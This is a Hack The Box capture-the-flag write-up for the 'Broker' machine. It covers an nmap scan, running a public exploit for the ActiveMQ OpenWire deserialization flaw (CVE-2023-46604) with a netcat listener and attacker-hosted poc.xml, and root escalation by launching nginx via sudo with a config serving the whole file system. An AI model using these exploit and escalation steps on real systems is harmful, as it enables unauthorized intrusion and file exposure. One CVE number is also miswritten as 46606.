# Broker

## Info

Broker is an easy rated linux machine from hack the box.

## Nmap

All ports tcp scan.

```
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
1883/tcp  open  mqtt       syn-ack ttl 63
5672/tcp  open  amqp?      syn-ack ttl 63
8161/tcp  open  http       syn-ack ttl 63 Jetty 9.4.39.v20210325
42683/tcp open  tcpwrapped syn-ack ttl 63
61613/tcp open  stomp      syn-ack ttl 63 Apache ActiveMQ
61614/tcp open  http       syn-ack ttl 63 Jetty 9.4.39.v20210325
61616/tcp open  apachemq   syn-ack ttl 63 ActiveMQ OpenWire transport

## User

Port 61616 is vulnerable to RCE due to unsafe deserialization within the OpenWire protocol. CVE-2023-46604.

Public exploit for CVE-2023-46606 (python).

```
https://github.com/evkl1d/CVE-2023-46604/tree/main
```

After starting a netcat listener and python webserver that can access the poc.xml, the following command is used.

```
python3 exploit.py -i 10.129.230.87 -p 61616 -u http://10.10.14.67/poc.xml
```

## Root

Trying sudo without a password shows the following command is allowed to run as root.

```
/usr/sbin/nginx
```

Creating the following config file allows the server to open 1337 and access the full file system.

```
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
server {
    listen 1337;
    root /;
    autoindex on;
}
}
```

Then run the command.

```
/usr/sbin/nginx -c /tmp/nginx.conf
```
Any file can be accessed on port 1337.
